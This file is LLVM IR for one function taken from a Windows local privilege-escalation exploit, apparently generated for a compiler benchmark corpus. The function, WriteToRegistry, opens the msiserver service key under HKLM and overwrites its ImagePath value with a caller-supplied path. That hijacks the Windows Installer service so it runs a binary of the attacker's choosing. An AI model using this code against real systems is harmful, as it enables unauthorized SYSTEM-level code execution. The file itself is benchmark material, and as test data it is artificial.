; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43929.c_WriteToRegistry.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43929.c_WriteToRegistry.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@HKEY_LOCAL_MACHINE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [44 x i8] c"SYSTEM\\CurrentControlSet\\services\\msiserver\00", align 1
@KEY_WRITE = common dso_local global i32 0, align 4
@ERROR_SUCCESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [38 x i8] c"\0A[-] Registry key failed to open %d\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"ImagePath\00", align 1
@REG_EXPAND_SZ = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [41 x i8] c"\0A[-] Registry value failed to write %d\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [44 x i8] c"\0A[+] Registry key opened and value modified\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @WriteToRegistry(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %4 = load i32, i32* @HKEY_LOCAL_MACHINE, align 4
  %5 = load i32, i32* @KEY_WRITE, align 4
  %6 = call i64 @RegOpenKeyEx(i32 %4, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0), i32 0, i32 %5, i32* %3)
  %7 = load i64, i64* @ERROR_SUCCESS, align 8
  %8 = icmp ne i64 %6, %7
  br i1 %8, label %9, label %13

9:                                                ; preds = %1
  %10 = call i32 (...) @GetLastError()
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0), i32 %10)
  %12 = call i32 @ExitProcess(i32 1)
  br label %13

13:                                               ; preds = %9, %1
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* @REG_EXPAND_SZ, align 4
  %16 = load i8*, i8** %2, align 8
  %17 = ptrtoint i8* %16 to i32
  %18 = load i8*, i8** %2, align 8
  %19 = call i32 @strlen(i8* %18)
  %20 = call i64 @RegSetValueEx(i32 %14, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i32 0, i32 %15, i32 %17, i32 %19)
  %21 = load i64, i64* @ERROR_SUCCESS, align 8
  %22 = icmp ne i64 %20, %21
  br i1 %22, label %23, label %27

23:                                               ; preds = %13
  %24 = call i32 (...) @GetLastError()
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.3, i64 0, i64 0), i32 %24)
  %26 = call i32 @ExitProcess(i32 1)
  br label %27

27:                                               ; preds = %23, %13
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.4, i64 0, i64 0))
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @RegCloseKey(i32 %29)
  ret i32 0
}

declare dso_local i64 @RegOpenKeyEx(i32, i8*, i32, i32, i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i32 @ExitProcess(i32) #1

declare dso_local i64 @RegSetValueEx(i32, i8*, i32, i32, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @RegCloseKey(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
